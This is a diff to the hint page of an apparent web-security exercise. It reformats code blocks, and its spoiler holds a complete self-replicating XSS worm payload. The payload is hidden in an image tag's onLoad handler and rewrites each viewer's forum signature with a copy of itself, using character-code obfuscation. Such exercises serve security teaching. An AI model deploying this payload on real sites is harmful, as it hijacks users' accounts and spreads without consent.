@@ -55,10 +55,15 @@ String.prototype.toCharCode = function(){
 <details> 
   <summary>Click for hint 5</summary>
    If you run into trouble concatenating javascript strings with the plus symbol (+), try using the concat function instead!
-   ```str1.concat(str2);```
+   ```
+   str1.concat(str2);
+   ```
 </details>
 
 <details> 
   <summary>Major Spoiler - one possible solution</summary>
-   ```[img]http://www.nyan.cat/cats/original.gif" id='uniqueimgid' onLoad="var xmlhttp;if (window.XMLHttpRequest) xmlhttp=new XMLHttpRequest();else xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');xmlhttp.open('POST', 'preferences.php?action=profilesig2', true);xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xmlhttp.send('newprofilesig='.concat(String.fromCharCode(91,105,109,103,93,104,116,116,112,58,47,47,119,119,119,46,110,121,97,110,46,99,97,116,47,99,97,116,115,47,111,114,105,103,105,110,97,108,46,103,105,102,34,32,105,100,61,39,117,110,105,113,117,101,105,109,103,105,100,39,32,111,110,76,111,97,100,61,34)).concat(document.getElementById('uniqueimgid').getAttribute('onLoad')).concat(String.fromCharCode(91, 47, 105, 109, 103, 93)));[/img]```
+  If you've come this far but can't quite finish it off, I feel obligated to show you what a solution would look like. Here you go!
+   ```
+   [img]http://www.nyan.cat/cats/original.gif" id='uniqueimgid' onLoad="var xmlhttp;if (window.XMLHttpRequest) xmlhttp=new XMLHttpRequest();else xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');xmlhttp.open('POST', 'preferences.php?action=profilesig2', true);xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xmlhttp.send('newprofilesig='.concat(String.fromCharCode(91,105,109,103,93,104,116,116,112,58,47,47,119,119,119,46,110,121,97,110,46,99,97,116,47,99,97,116,115,47,111,114,105,103,105,110,97,108,46,103,105,102,34,32,105,100,61,39,117,110,105,113,117,101,105,109,103,105,100,39,32,111,110,76,111,97,100,61,34)).concat(document.getElementById('uniqueimgid').getAttribute('onLoad')).concat(String.fromCharCode(91, 47, 105, 109, 103, 93)));[/img]
+   ```
 </details>
